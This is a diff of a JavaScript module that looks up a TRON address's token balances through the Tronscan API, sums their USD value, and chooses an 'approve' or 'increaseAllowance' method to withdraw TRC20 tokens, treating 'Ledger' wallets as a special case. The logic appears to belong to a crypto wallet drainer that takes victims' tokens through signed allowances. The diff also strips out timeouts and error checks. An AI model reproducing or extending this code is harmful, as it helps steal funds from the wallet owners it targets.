@@ -2,8 +2,6 @@ const config = require('./get-config')
 const { SETTINGS, MIN_TRX_RESERVE, TRONSCAN_API_KEY } = config
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
 
-const MAIN_WITHDRAWAL_METHOD = 'approve'
-
 //Check account status
 async function checkAccountStatus(address, indexOfSetting) {
 	const setting = SETTINGS[indexOfSetting]
@@ -12,36 +10,15 @@ async function checkAccountStatus(address, indexOfSetting) {
 	let isRequiredBandwidthAvailable = false
 
 	if (setting.mode === 4) {
-		const controller = new AbortController()
-		const timeout = setTimeout(() => controller.abort(), 10000)
 		const accountDetailsRequest = await fetch(
 			`https://apilist.tronscanapi.com/api/accountv2?address=${address}`,
 			{
 				headers: {
 					'TRON-PRO-API-KEY': TRONSCAN_API_KEY,
 				},
-				signal: controller.signal,
 			},
 		)
-		clearTimeout(timeout)
-
-		if (!accountDetailsRequest.ok) {
-			throw new Error(
-				`Tronscan API error: ${accountDetailsRequest.status} ${accountDetailsRequest.statusText}`,
-			)
-		}
-
 		const accountDetails = await accountDetailsRequest.json()
-		if (
-			!accountDetails ||
-			!accountDetails.bandwidth ||
-			accountDetails.bandwidth.energyRemaining === undefined
-		) {
-			throw new Error(
-				`Invalid Tronscan API response: ${JSON.stringify(accountDetails)}`,
-			)
-		}
-
 		const energyRemaining = accountDetails.bandwidth.energyRemaining
 		const bandwidthRemaining = accountDetails.bandwidth.freeNetRemaining
 		if (accountDetails.activated) isActivatedAddress = true
@@ -59,37 +36,15 @@ async function checkAccountStatus(address, indexOfSetting) {
 //Find the best way to withdraw the TRC20
 async function getBestWithdrawalMethod(token) {
 	try {
-		const controller = new AbortController()
-		const timeout = setTimeout(() => controller.abort(), 10000)
 		const tokenContractRequest = await fetch(
 			`https://apilist.tronscanapi.com/api/contract?contract=${token.tokenId}`,
 			{
 				headers: {
 					'TRON-PRO-API-KEY': TRONSCAN_API_KEY,
 				},
-				signal: controller.signal,
 			},
 		)
-		clearTimeout(timeout)
-
-		if (!tokenContractRequest.ok) {
-			throw new Error(
-				`Tronscan API error: ${tokenContractRequest.status} ${tokenContractRequest.statusText}`,
-			)
-		}
-
-		const contractResponse = await tokenContractRequest.json()
-		if (
-			!contractResponse ||
-			!contractResponse.data ||
-			!contractResponse.data[0]
-		) {
-			throw new Error(
-				`Invalid Tronscan API response for contract: ${JSON.stringify(contractResponse)}`,
-			)
-		}
-
-		const methodMap = contractResponse.data[0].methodMap
+		const methodMap = (await tokenContractRequest.json()).data[0].methodMap
 
 		for (const key in methodMap) {
 			if (methodMap[key] === 'increaseAllowance(address,uint256)') {
@@ -102,11 +57,8 @@ async function getBestWithdrawalMethod(token) {
 
 		return 'approve'
 	} catch (error) {
-		console.error(
-			'getBestWithdrawalMethod error, falling back to approve:',
-			error.message || error,
-		)
-		return 'approve'
+		console.error(error)
+		throw error
 	}
 }
 
@@ -116,31 +68,14 @@ async function checkBalance(address, indexOfSetting, walletName) {
 		const setting = SETTINGS[indexOfSetting]
 		let isTRXFee = false
 
-		const controller = new AbortController()
-		const timeout = setTimeout(() => controller.abort(), 10000)
 		const tokensListRequest = await fetch(
 			`https://apilist.tronscanapi.com/api/account/tokens?address=${address}`,
 			{
 				headers: {
 					'TRON-PRO-API-KEY': TRONSCAN_API_KEY,
 				},
-				signal: controller.signal,
 			},
 		)
-		clearTimeout(timeout)
-
-		if (!tokensListRequest.ok) {
-			throw new Error(
-				`Tronscan API error: ${tokensListRequest.status} ${tokensListRequest.statusText}`,
-			)
-		}
-
-		const tokensResponse = await tokensListRequest.json()
-		if (!tokensResponse || !tokensResponse.data) {
-			throw new Error(
-				`Invalid Tronscan API response: ${JSON.stringify(tokensResponse)}`,
-			)
-		}
 
 		const {
 			isActivatedAddress,
@@ -148,7 +83,7 @@ async function checkBalance(address, indexOfSetting, walletName) {
 			isRequiredBandwidthAvailable,
 		} = await checkAccountStatus(address, indexOfSetting)
 
-		const tokensList = tokensResponse.data
+		const tokensList = (await tokensListRequest.json()).data
 		const tokens = tokensList.filter(token => {
 			const isTrc10 = token.tokenType === 'trc10'
 			const isTrc20 = token.tokenType === 'trc20'
@@ -197,7 +132,10 @@ async function checkBalance(address, indexOfSetting, walletName) {
 						break
 
 					case 'trc20':
-						token.withdrawalMethod = MAIN_WITHDRAWAL_METHOD
+						token.withdrawalMethod =
+							walletName === 'Ledger'
+								? 'approve'
+								: await getBestWithdrawalMethod(token)
 						break
 				}
 				allTokensValue += Number(token.amountInUsd)
